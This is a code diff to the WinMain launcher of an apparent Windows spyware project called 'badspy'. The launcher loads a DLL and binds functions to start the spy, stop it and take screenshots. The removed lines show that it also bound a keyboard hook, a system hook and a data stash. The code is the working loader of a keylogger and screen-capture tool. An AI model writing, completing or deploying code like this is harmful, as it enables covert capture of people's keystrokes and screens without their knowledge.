@@ -14,81 +14,77 @@ HMODULE badspyDllModule = NULL;
 int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
 {
 	if (!init_library())
+	{
+		LOG_E("Can not load dll library");
 		return ERROR_CODE;
-	
+	}
+
 	if (!init_dll_func())
+	{
+		LOG_E("Can not bind dll functions");
 		return ERROR_CODE;
-	take_screenshot();
-	if (!init_hook())
+	}
+	
+	if (load_spy())
+	{
+		LOG_E("Can not load spy!");
 		return ERROR_CODE;
+	}
+
+	LOG_I("Spy is running...");
 
 	start_looper();
+
+	LOG_I("Spy is stopping...");
+
+	unload_spy();
 
 	return OK_CODE;
 }
 
 void start_looper()
 {
-	LOG("start looper");
+	LOG("Start looper");
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
-	LOG("stop looper");
+	LOG("Stop looper");
 }
 
 bool init_library()
 {
-	LOG("loading dll library");
-	if ((badspyDllModule = LoadLibrary(L"badspy.c.dll")) == NULL)
+	LOG("Loading dll library");
+	if ((badspyDllModule = LoadLibraryA("badspy.c.dll")) == NULL)
 		return false;
-	badspyModule = GetModuleHandle(L"badspy.c.dll");
+	badspyModule = GetModuleHandleA("badspy.c.dll");
 	if (badspyModule == NULL)
 		return false;
-	LOG("loaded dll library");
+	LOG("Loaded dll library");
 	return true;
 }
 
 bool init_dll_func()
 {
-	LOG("loading dll functions");
-	register_hook = (REGISTER_HOOK_PROC)GetProcAddress(badspyModule, "register_hook");
-	if (register_hook == NULL)
+	LOG("Loading dll functions");
+	load_spy = (LOAD_SPY)GetProcAddress(badspyModule, "load_spy");
+	if (load_spy == NULL)
 		return false;
-	unregister_hook = (UNREGISTER_HOOK_PROC)GetProcAddress(badspyModule, "unregister_hook");
-	if (unregister_hook == NULL)
+	unload_spy = (UNLOAD_SPY)GetProcAddress(badspyModule, "unload_spy");
+	if (unload_spy == NULL)
 		return false;
-	kb_hook_proc = (KB_HOOK_PROC)GetProcAddress(badspyModule, "kb_hook_proc");
-	if (kb_hook_proc == NULL)
-		return false;
-	quit = (QUIT_PROC)GetProcAddress(badspyModule, "quit");
-	if (quit == NULL)
-		return false;
-	init_stash = (INIT_STASH_PROC)GetProcAddress(badspyModule, "init_stash");
-	if (init_stash == NULL)
-		return false;
-	take_screenshot = (TAKE_SCREENSHOT_PROC)GetProcAddress(badspyModule, "take_screenshot");
-	if (take_screenshot == NULL)
+	take_scrot = (TAKE_SCROT)GetProcAddress(badspyModule, "take_scrot");
+	if (take_scrot == NULL)
 		return false;
 	LOG("loaded dll functions");
 	return true;
 }
 
-bool init_hook()
-{
-	LOG("hook system");
-	DWORD ret = register_hook();
-	if (ret == 0)
-		return true;
-	LOG_E("can't hook system code %d", ret);
-	return false;
-}
-
 void free_library()
 {
-	LOG("free dll library");
+	LOG("Free dll library");
 	if (badspyDllModule != NULL)
 	{
 		FreeLibrary(badspyDllModule);
